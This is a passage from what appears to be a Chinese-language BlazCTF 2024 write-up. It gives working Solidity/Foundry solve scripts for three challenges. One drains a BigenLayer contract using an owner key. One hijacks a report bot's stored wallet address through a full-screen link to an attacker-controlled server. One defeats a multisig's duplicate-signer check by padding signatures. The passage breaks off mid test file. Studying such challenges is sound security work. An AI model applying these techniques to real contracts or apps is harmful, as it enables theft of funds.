0x2011082420110824201108242011082420110824;</span><br><span class="line">    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;</span><br><span class="line">    uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));</span><br><span class="line">    uint256 OwnerPrivateKey = 0x0000000000000000000000000000000000000000000000000000000000001337;</span><br><span class="line"></span><br><span class="line">    function run() external {</span><br><span class="line">        address challenge = vm.envAddress("CHALLENGE");</span><br><span class="line">        solve(challenge, vm.addr(playerPrivateKey));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function solve(address challenge, address player) internal {</span><br><span class="line">        vm.startBroadcast(playerPrivateKey);</span><br><span class="line"></span><br><span class="line">        (bool success,) = OWNER.call{value: 1000000000000000}("");</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The script path may be different</span></span><br><span class="line">forge script --fork-url <span class="variable">$RPC</span> script/Solve_pre_pre.s.sol -vvvv --broadcast --legacy</span><br></pre></td></tr></table></figure></div>

<p>Or</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cast send --private-key <span class="variable">$PLAYER</span> --value 1000000000000000 --rpc-url <span class="variable">$RPC</span> --legacy <span class="variable">$OWNER</span> <span class="string">'0x'</span></span><br></pre></td></tr></table></figure></div>

<h5 id="2-利用-OWNER-身分來-BigenLayer-adminRequestWithdrawal"><a href="#2-利用-OWNER-身分來-BigenLayer-adminRequestWithdrawal" class="headerlink" title="2. 利用 OWNER 身分來  BigenLayer.adminRequestWithdrawal"></a>2. 利用 <code>OWNER</code> 身分來  <code>BigenLayer.adminRequestWithdrawal</code></h5><h6 id="script-Solve-pre-s-sol"><a href="#script-Solve-pre-s-sol" class="headerlink" title="script/Solve_pre.s.sol"></a><code>script/Solve_pre.s.sol</code></h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "forge-ctf/CTFSolver.sol";</span><br><span class="line">import "forge-std/Script.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract Solve is Script {</span><br><span class="line">    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;</span><br><span class="line">    address public constant OWNER = 0x71556C38F44e17EC21F355Bd18416155000BF5a6;</span><br><span class="line">    uint256 playerPrivateKey = vm.envOr("PLAYER", uint256(0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80));</span><br><span class="line">    uint256 OwnerPrivateKey = 0x0000000000000000000000000000000000000000000000000000000000001337;</span><br><span class="line"></span><br><span class="line">    function run() external {</span><br><span class="line">        address challenge = vm.envAddress("CHALLENGE");</span><br><span class="line">        solve(challenge, vm.addr(playerPrivateKey));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function solve(address challenge, address player) internal {</span><br><span class="line">        vm.startBroadcast(OwnerPrivateKey);</span><br><span class="line"></span><br><span class="line">        BigenLayer bigenLayer = Challenge(challenge).bigen();</span><br><span class="line">        bigenLayer.adminRequestWithdrawal(TIM_COOK, 16 * 10 ** 18, player);</span><br><span class="line"></span><br><span class="line">        vm.stopBroadcast();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge script --fork-url <span class="variable">$RPC</span> script/Solve_pre.sol -vvvv --broadcast --legacy</span><br></pre></td></tr></table></figure></div>

<h5 id="3-Finalize-Withdrawal"><a href="#3-Finalize-Withdrawal" class="headerlink" title="3. Finalize Withdrawal"></a>3. Finalize Withdrawal</h5><h6 id="script-Solve-post-sol"><a href="#script-Solve-post-sol" class="headerlink" title="script/Solve_post.sol"></a>script/Solve_post.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import "forge-ctf/CTFSolver.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract Solve is CTFSolver {</span><br><span class="line">    address public constant TIM_COOK = 0x2011082420110824201108242011082420110824;</span><br><span class="line">    function solve(address challenge, address player) internal override {</span><br><span class="line">        BigenLayer bigenLayer = Challenge(challenge).bigen();</span><br><span class="line">        bigenLayer.finalizeWithdrawal(TIM_COOK);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>這邊直接繼承了 forge-ctf/CTFSolver.sol，所以只要把 <code>CHALLENGE</code> 跟 <code>PLAYER</code> 的環境變數設好，其他部分就不用自己寫了。(<code>PLAYER</code> 的環境變數是 player 的 private key)，執行這部的時候要跟前一步距離一些時間來滿足 <code>bigenLayer.finalizeWithdrawal</code>  的條件。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge script --fork-url <span class="variable">$RPC</span> script/Solve_post.sol -vvvv --broadcast --legacy</span><br></pre></td></tr></table></figure></div>

<h3 id="Tonyallet"><a href="#Tonyallet" class="headerlink" title="Tonyallet"></a>Tonyallet</h3><h4 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h4><blockquote>
<p>Tony Ads #2 After his DeFi dreams crashed, Tony pivoted to SocialFi, crafting a buzzword-laden pitch that had VCs practically throwing money at him, all while he secretly chuckled at the irony of his newfound success.</p>
<p>Ping @tonyalletbot on Telegram! You can also report posts at <a class="link" target="_blank" rel="noopener" href="https://tonyallet-us-report.ctf.so/">https://tonyallet-us-report.ctf.so/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>題目給了一個 <a class="link" target="_blank" rel="noopener" href="https://core.telegram.org/bots/webapps">Telegram Mini App <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，可以透過 Telegram 打開其網頁與其互動。題目還給了 Report bot，他會做以下<a class="link" target="_blank" rel="noopener" href="https://docs.google.com/document/d/1YMkYTSOmG_Dg9OIsVlCGAKfvMPYYij9ZVCSXIPqFwes/edit?usp=sharing">步驟 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>：</p>
<img src="/blazctf-2024/tony-wallet-step12.webp" alt="tony-wallet-step12" style="width: 25em;">

<img src="/blazctf-2024/tony-wallet-step34.webp" alt="tony-wallet-step12" style="width: 25em;">

<h4 id="題解-1"><a href="#題解-1" class="headerlink" title="題解"></a>題解</h4><p>Bot 會去看 <code>/post?id=&lt;user_provided_id&gt;</code> 頁面，裡面用了 DomPurify 所以很難 XSS（如下），但是題目說 bot 會去點擊按鈕。可以透過製造一個很大的 <code>&lt;a&gt;</code> 讓 bot 點進我們可控的網頁。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getPost</span>(<span class="params">postId</span>) {</span><br><span class="line">    <span class="keyword">try</span> {</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/posts/<span class="subst">${postId}</span>`</span>, {</span><br><span class="line">            <span class="attr">method</span>: <span class="string">'GET'</span></span><br><span class="line">        });</span><br><span class="line">        <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">        <span class="keyword">const</span> postDetails = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'postDetails'</span>);</span><br><span class="line">        postDetails.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(</span><br><span class="line">            <span class="string">`</span></span><br><span class="line"><span class="string">            &lt;h3&gt;<span class="subst">${data.title}</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;<span class="subst">${data.content}</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Author Hash: <span class="subst">${data.author}</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Timestamp: <span class="subst">${<span class="keyword">new</span> <span class="built_in">Date</span>().toISOString()}</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">        `</span>, { <span class="attr">USE_PROFILES</span>: { <span class="attr">html</span>: <span class="literal">true</span> } }</span><br><span class="line">        );</span><br><span class="line">    } <span class="keyword">catch</span> (error) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">'Error fetching post:'</span>, error);</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">'Failed to retrieve post. Please check the UUID and try again.'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">goBack</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">history</span>.<span class="title function_">back</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> query = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span><br><span class="line"><span class="keyword">const</span> pid = query.<span class="title function_">split</span>(<span class="string">"="</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="title function_">getPost</span>(pid);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 我們的巨大 <span class="tag">&lt;<span class="name">a</span>&gt;</span> 按鈕</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://&lt;attacker_c2_server&gt;/"</span> <span class="attr">style</span>=<span class="string">"width:100%;height:100%;position:fixed;background:#ff0;top:0;left:0;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在我們可控的頁面，把 bot 重新導向到帶著我們自己 <code>#tgWebAppData</code> 的 Telegram Mini App 首頁網址（如下）。</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    location = <span class="string">'https://tonyallet-us.ctf.so/#tgWebAppData=query_id...'</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>這樣 bot browser 的 localStorage 的 <code>walletAddress</code> 就會被設成我們的 address。當 bot 再次進入首頁時，抓到的就會是我們的 address（如下），所以會送 Ether 進來我們的 address，就解了。他 flag 給的方式有點通靈，會藏在流量裡。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">const tg = window.Telegram.WebApp || {</span><br><span class="line">    initData: 123</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">async function getWallet(bypass=false) {</span><br><span class="line">    let localAddress = localStorage.getItem("walletAddress")</span><br><span class="line">    if (localAddress &amp;&amp; !bypass) {</span><br><span class="line">        document.getElementById('walletAddress').textContent = localAddress;</span><br><span class="line">        return</span><br><span class="line">    }</span><br><span class="line">    try {</span><br><span class="line">        const response = await fetch(`/wallet`, {</span><br><span class="line">            method: 'GET',</span><br><span class="line">            headers: {</span><br><span class="line">                'Authorization': tg.initData</span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line">        const data = await response.json();</span><br><span class="line">        document.getElementById('walletAddress').textContent = data.address;</span><br><span class="line">        localStorage.setItem("walletAddress", data.address);</span><br><span class="line">    } catch (error) {</span><br><span class="line">        console.error('Error fetching wallet:', error);</span><br><span class="line">        alert('Failed to generate wallet. Please try again.');</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">// [...]</span><br><span class="line">getWallet()</span><br></pre></td></tr></table></figure></div>

<h3 id="Cyber-Cartel"><a href="#Cyber-Cartel" class="headerlink" title="Cyber Cartel"></a>Cyber Cartel</h3><h4 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">contract Challenge {</span><br><span class="line">    address public immutable TREASURY;</span><br><span class="line"></span><br><span class="line">    constructor(address treasury) {</span><br><span class="line">        TREASURY = treasury;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function isSolved() external view returns (bool) {</span><br><span class="line">        return address(TREASURY).balance == 0;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line">contract CartelTreasury {</span><br><span class="line">    uint256 public constant MIN_TIME_BETWEEN_SALARY = 1 minutes;</span><br><span class="line"></span><br><span class="line">    address public bodyGuard;</span><br><span class="line">    mapping(address =&gt; uint256) public lastTimeSalaryPaid;</span><br><span class="line"></span><br><span class="line">    function initialize(address bodyGuard_) external {</span><br><span class="line">        require(bodyGuard == address(0), "Already initialized");</span><br><span class="line">        bodyGuard = bodyGuard_;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    modifier guarded() {</span><br><span class="line">        require(bodyGuard == address(0) || bodyGuard == msg.sender, "Who?");</span><br><span class="line">        _;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function doom() external guarded {</span><br><span class="line">        payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /// Dismiss the bodyguard</span><br><span class="line">    function gistCartelDismiss() external guarded {</span><br><span class="line">        bodyGuard = address(0);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /// Payout the salary to the caller every 1 minute</span><br><span class="line">    function salary() external {</span><br><span class="line">        require(block.timestamp - lastTimeSalaryPaid[msg.sender] &gt;= MIN_TIME_BETWEEN_SALARY, "Too soon");</span><br><span class="line">        lastTimeSalaryPaid[msg.sender] = block.timestamp;</span><br><span class="line">        payable(msg.sender).transfer(0.0001 ether);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    receive() external payable {}</span><br><span class="line">}</span><br><span class="line">contract BodyGuard {</span><br><span class="line">    bytes public constant DIGEST_SEED = hex"80840397b652018080";</span><br><span class="line">    address public treasury;</span><br><span class="line">    uint8 lastNonce = 0;</span><br><span class="line">    uint8 minVotes = 0;</span><br><span class="line">    mapping(address =&gt; bool) public guardians;</span><br><span class="line"></span><br><span class="line">    struct Proposal {</span><br><span class="line">        uint32 expiredAt;</span><br><span class="line">        uint24 gas;</span><br><span class="line">        uint8 nonce;</span><br><span class="line">        bytes data;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    constructor(address treasury_, address[] memory guardians_) {</span><br><span class="line">        require(treasury == address(0), "Already initialized");</span><br><span class="line">        treasury = treasury_;</span><br><span class="line">        for (uint256 i = 0; i &lt; guardians_.length; i++) {</span><br><span class="line">            guardians[guardians_[i]] = true;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        minVotes = uint8(guardians_.length);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function propose(Proposal memory proposal, bytes[] memory signatures) external {</span><br><span class="line">        require(proposal.expiredAt &gt; block.timestamp, "Expired");</span><br><span class="line">        require(proposal.nonce &gt; lastNonce, "Invalid nonce");</span><br><span class="line"></span><br><span class="line">        uint256 minVotes_ = minVotes;</span><br><span class="line">        if (guardians[msg.sender]) {</span><br><span class="line">            minVotes_--;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        require(minVotes_ &lt;= signatures.length, "Not enough signatures");</span><br><span class="line">        require(validateSignatures(hashProposal(proposal), signatures), "Invalid signatures");</span><br><span class="line"></span><br><span class="line">        lastNonce = proposal.nonce;</span><br><span class="line"></span><br><span class="line">        uint256 gasToUse = proposal.gas;</span><br><span class="line">        if (gasleft() &lt; gasToUse) {</span><br><span class="line">            gasToUse = gasleft();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        (bool success,) = treasury.call{gas: gasToUse * 9 / 10}(proposal.data);</span><br><span class="line">        if (!success) {</span><br><span class="line">            revert("Execution failed");</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function hashProposal(Proposal memory proposal) public view returns (bytes32) {</span><br><span class="line">        return keccak256(</span><br><span class="line">            abi.encodePacked(proposal.expiredAt, proposal.gas, proposal.data, proposal.nonce, treasury, DIGEST_SEED)</span><br><span class="line">        );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function validateSignatures(bytes32 digest, bytes[] memory signaturesSortedBySigners) public view returns (bool) {</span><br><span class="line">        bytes32 lastSignHash = bytes32(0); // ensure that the signers are not duplicated</span><br><span class="line"></span><br><span class="line">        for (uint256 i = 0; i &lt; signaturesSortedBySigners.length; i++) {</span><br><span class="line">            address signer = recoverSigner(digest, signaturesSortedBySigners[i]);</span><br><span class="line">            require(guardians[signer], "Not a guardian");</span><br><span class="line"></span><br><span class="line">            bytes32 signHash = keccak256(signaturesSortedBySigners[i]);</span><br><span class="line">            if (signHash &lt;= lastSignHash) {</span><br><span class="line">                return false;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            lastSignHash = signHash;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function recoverSigner(bytes32 digest, bytes memory signature) public pure returns (address) {</span><br><span class="line">        bytes32 r;</span><br><span class="line">        bytes32 s;</span><br><span class="line">        uint8 v;</span><br><span class="line">        assembly {</span><br><span class="line">            r := mload(add(signature, 32))</span><br><span class="line">            s := mload(add(signature, 64))</span><br><span class="line">            v := byte(0, mload(add(signature, 96)))</span><br><span class="line">        }</span><br><span class="line">        return ecrecover(digest, v, r, s);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<h4 id="題解-2"><a href="#題解-2" class="headerlink" title="題解"></a>題解</h4><p>在 <code>BodyGuard::validateSignatures</code> 中，沒有檢查好有無同個人重複簽名。可以在同個人的簽名 encodePacked 的內容後面塞一些垃圾，合約就會以為是不同人簽的，但 ecrecover 解出來的仍然是正確的。如下。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bytes[] memory signaturesSortedBySigners = new bytes[](2);</span><br><span class="line"></span><br><span class="line">uint8 v; bytes32 r; bytes32 s;</span><br><span class="line">(v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">signaturesSortedBySigners[0] = abi.encodePacked(r, s, v);</span><br><span class="line"></span><br><span class="line">(v, r, s) = vm.sign(playerPrivateKey, proposalHash);</span><br><span class="line">signaturesSortedBySigners[1] = abi.encodePacked(r, s, v, address(0x1));</span><br><span class="line"></span><br><span class="line">guard.propose(proposal, signaturesSortedBySigners);</span><br></pre></td></tr></table></figure></div>

<h4 id="解題環境細節-1"><a href="#解題環境細節-1" class="headerlink" title="解題環境細節"></a>解題環境細節</h4><p>在解題過程需要測試，這邊拿 <a class="link" target="_blank" rel="noopener" href="https://damnvulnerabledefi.xyz/">Damn Vulnerable DeFi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的 test script 來改，測試起來蠻方便的。</p>
<h6 id="test-Solve-t-sol"><a href="#test-Solve-t-sol" class="headerlink" title="test/Solve.t.sol"></a>test/Solve.t.sol</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)</span><br><span class="line">pragma solidity =0.8.25;</span><br><span class="line"></span><br><span class="line">import {Test, console} from "forge-std/Test.sol";</span><br><span class="line">import "forge-ctf/CTFDeployer.sol";</span><br><span class="line">import "src/CyberCartel.sol";</span><br><span class="line">import "src/Challenge.sol";</span><br><span class="line"></span><br><span class="line">contract CyberCartelChallenge is Test {</span><br><span class="line">    uint256 playerPrivateKey = uint256(keccak256("player"));</span><br><span class="line">    address player = vm.addr(playerPrivateKey);</span><br><span class="line"></span><br><span class="line">    Challenge challenge;</span><br><span class="line"></span><br><span class="line">    modifier checkSolvedByPlayer() {</span><br><span class="line">        vm.startPrank(player, player);</span><br><span class="line">        _;</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        _isSolved();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * SETS UP CHALLENGE - DO NOT TOUCH</span><br><span class="line">     */</span><br><span class="line">    function setUp() public {</span><br><span class="line">        // startHoax(deployer);</span><br><span class="line">        address system = makeAddr("system");</span><br><span class="line">        uint256 privateKey = uint256(keccak256("CyberCartel"));</span><br><span class="line">        address deployer = vm.addr(privateKey);</span><br><span class="line"></span><br><span class="line">        CartelTreasury cartel;</span><br><span class="line">        vm.deal(system, 1000 ether);</span><br><span class="line"></span><br><span class="line">        {</span><br><span class="line">            vm.startBroadcast(system);</span><br><span class="line">            t(deployer, 888 ether);</span><br><span class="line">            vm.stopBroadcast();</span><br><span 